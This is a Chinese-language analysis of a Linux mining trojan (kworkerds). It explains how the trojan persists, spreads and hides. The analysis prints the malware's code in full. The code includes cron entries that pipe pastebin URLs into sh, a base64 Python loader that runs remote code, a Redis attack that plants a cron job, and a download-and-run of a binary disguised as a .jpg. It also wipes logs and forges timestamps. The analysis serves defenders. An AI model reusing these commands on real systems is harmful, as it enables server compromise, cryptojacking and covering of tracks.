木马的核心代码逻辑如下：

```
update=$( curl -fsSL --connect-timeout 120 https://pastebin.com/raw/TzBeq3AM )
if [ ${update}x = "update"x ];then
	echocron
else
	if [ ! -f "/tmp/.tmph" ]; then
		rm -rf /tmp/.tmph
		python
	fi
	kills
	downloadrun
	echocron
	system
	top
	sleep 10
	port=$(netstat -anp | grep :13531 | wc -l)
	if [ ${port} -eq 0 ];then
		downloadrunxm
	fi
	echo 0>/var/spool/mail/root
	echo 0>/var/log/wtmp
	echo 0>/var/log/secure
	echo 0>/var/log/cron
fi
```



首先检查是否有更新，有更新就会执行 echocron 方法进行更新。

```
function echocron() {
	echo -e "*/10 * * * * root (curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|sh\n##" > /etc/cron.d/root
	echo -e "*/17 * * * * root (curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|sh\n##" > /etc/cron.d/system
	echo -e "*/23 * * * *	(curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|sh\n##" > /var/spool/cron/root
	mkdir -p /var/spool/cron/crontabs
	echo -e "*/31 * * * *	(curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|sh\n##" > /var/spool/cron/crontabs/root
	mkdir -p /etc/cron.hourly
	curl -fsSL https://pastebin.com/raw/5bjpjvLP -o /etc/cron.hourly/oanacron && chmod 755 /etc/cron.hourly/oanacron
	if [ ! -f "/etc/cron.hourly/oanacron" ]; then
		wget https://pastebin.com/raw/5bjpjvLP -O /etc/cron.hourly/oanacron && chmod 755 /etc/cron.hourly/oanacron
	fi
	mkdir -p /etc/cron.daily
	curl -fsSL https://pastebin.com/raw/5bjpjvLP -o /etc/cron.daily/oanacron && chmod 755 /etc/cron.daily/oanacron
	if [ ! -f "/etc/cron.daily/oanacron" ]; then
		wget https://pastebin.com/raw/5bjpjvLP -O /etc/cron.daily/oanacron && chmod 755 /etc/cron.daily/oanacron
	fi
	mkdir -p /etc/cron.monthly
	curl -fsSL https://pastebin.com/raw/5bjpjvLP -o /etc/cron.monthly/oanacron && chmod 755 /etc/cron.monthly/oanacron
	if [ ! -f "/etc/cron.monthly/oanacron" ]; then
		wget https://pastebin.com/raw/5bjpjvLP -O /etc/cron.monthly/oanacron && chmod 755 /etc/cron.monthly/oanacron
	fi
	touch -acmr /bin/sh /var/spool/cron/root
	touch -acmr /bin/sh /var/spool/cron/crontabs/root
	touch -acmr /bin/sh /etc/cron.d/system
	touch -acmr /bin/sh /etc/cron.d/root
	touch -acmr /bin/sh /etc/cron.hourly/oanacron
	touch -acmr /bin/sh /etc/cron.daily/oanacron
	touch -acmr /bin/sh /etc/cron.monthly/oanacron
}
```



检查 /tmp/.tmph 文件是否存在，如果存在则删除，执行 python 函数。

```
function python() {
	nohup python -c "import base64;exec(base64.b64decode('I2NvZGluZzogdXRmLTgKaW1wb3J0IHVybGxpYgppbXBvcnQgYmFzZTY0CgpkPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2VSa3JTUWZFJwp0cnk6CiAgICBwYWdlPWJhc2U2NC5iNjRkZWNvZGUodXJsbGliLnVybG9wZW4oZCkucmVhZCgpKQogICAgZXhlYyhwYWdlKQpleGNlcHQ6CiAgICBwYXNz'))" >/dev/null 2>&1 &
	touch /tmp/.tmph
}
```

base64 的 python 代码解码后内容为：

```
$ python
Python 3.5.0 (v3.5.0:374f501f4567, Sep 12 2015, 11:00:19)
[GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin
Type "help", "copyright", "credits" or "license" for more information.

>>> import base64
>>> base64.b64decode('I2NvZGluZzogdXRmLTgKaW1wb3J0IHVybGxpYgppbXBvcnQgYmFzZTY0CgpkPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2VSa3JTUWZFJwp0cnk6CiAgICBwYWdlPWJhc2U2NC5iNjRkZWNvZGUodXJsbGliLnVybG9wZW4oZCkucmVhZCgpKQogICAgZXhlYyhwYWdlKQpleGNlcHQ6CiAgICBwYXNz')
>>> b"#coding: utf-8\nimport urllib\nimport base64\n\nd= 'https://pastebin.com/raw/eRkrSQfE'\ntry:\n    page=base64.b64decode(urllib.urlopen(d).read())\n    exec(page)\nexcept:\n    pass"
```

解码后的 python 代码又从https://pastebin.com/raw/eRkrSQfE读取内容，进行执行。

再次解码后，内容为针对 redis 的攻击脚本，核心代码如下：

```
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)
s.connect((self.host, 6379))
s.send('set backup1 "\n\n\n*/1 * * * * curl -fsSL https://pastebin.com/raw/xbY7p5Tb|sh\n\n\n"rn')
s.send('set backup2 "\n\n\n*/1 * * * * wget -q -O- https://pastebin.com/raw/xbY7p5Tb|sh\n\n\n"rn')
s.send('config set dir /var/spool/cronrn')
s.send('config set dbfilename rootrn')
s.send('savern')
s.close()
```

接着，kills 函数主要是 kill 掉其他木马以及腾讯云、阿里云等安全监控服务。



downloadrun 函数是下载木马 kworkerds 脚本并执行。

```
function downloadrun() {
	ps=$(netstat -anp | grep :13531 | wc -l)
	if [ ${ps} -eq 0 ];then
		if [ ! -f "/tmp/kworkerds" ]; then
			curl -fsSL http://thyrsi.com/t6/358/1534495127x-1404764247.jpg -o /tmp/kworkerds && chmod 777 /tmp/kworkerds
			if [ ! -f "/tmp/kworkerds" ]; then
				wget http://thyrsi.com/t6/358/1534495127x-1404764247.jpg -O /tmp/kworkerds && chmod 777 /tmp/kworkerds
			fi
				nohup /tmp/kworkerds >/dev/null 2>&1 &
		else
			nohup /tmp/kworkerds >/dev/null 2>&1 &
		fi
	fi
}
```

接着执行 echocron 函数，写入定时任务，并清楚相关日志。

之后执行 system 和 top 函数，下载相关依赖文件，隐藏进程等。

sleep 10秒，判断是否与端口 13531 建立连接，如果没有则执行 downloadrunxm 函数，连接挖矿服务器。



隐藏木马文件文件，防止通过时间排序来判断木马文件。

    touch -acmr /bin/sh /etc/ld.so.preload

touch参数说明：

    a 改变文件的读取时间记录；
    c 假如文件不存在，不会建立新的文件。
    m 改变文件的修改时间记录；
    r 使用参考文件的时间记录。

定时任务相关文件

```
/var/spool/cron：目录下存放的是每个用户包括 root 的 crontab 任务，每个任务以创建者的名字命名。

/etc/cron.d：用来存放任何要执行的 crontab 文件或脚本。

/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly：用 anacron 执行周期性的定时任务。
```

